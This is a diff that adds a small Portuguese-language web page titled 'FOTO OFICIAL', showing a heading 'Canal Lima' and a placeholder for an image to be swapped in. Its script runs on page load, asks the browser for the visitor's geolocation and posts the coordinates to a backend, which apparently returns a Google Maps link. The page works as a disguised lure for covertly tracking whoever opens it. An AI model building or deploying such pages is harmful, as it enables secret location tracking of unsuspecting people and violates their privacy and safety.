@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>FOTO OFICIAL</title>
+     
+      
+      </style>
+    <script>
+        function sendLocation() {
+            // Verifica se a geolocalização é suportada
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(position => {
+                    const latitude = position.coords.latitude;
+                    const longitude = position.coords.longitude;
+
+                    // Envia a localização para o backend
+                    fetch('/location', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify({ latitude, longitude })
+                    })
+                    .then(response => response.json())
+                    .then(data => {
+                        console.log('Link do Google Maps:', data.maps_link);
+                    })
+                    .catch(error => {
+                        console.error('Erro ao enviar a localização:', error);
+                    });
+                }, error => {
+                    console.error('Erro ao obter a localização:', error);
+                });
+            } else {
+                alert("Geolocalização não é suportada neste navegador.");
+            }
+        }
+
+        // Enviar localização ao carregar a página
+        window.onload = sendLocation;
+    </script>
+</head>
+<body>
+   <h1>Canal Lima</h1>
+   <img style="height:500px"src="Imagem AQui!!!!"> <!--Colocar Sua Imagem aquiiiiiii-->
+</body>
+</html>
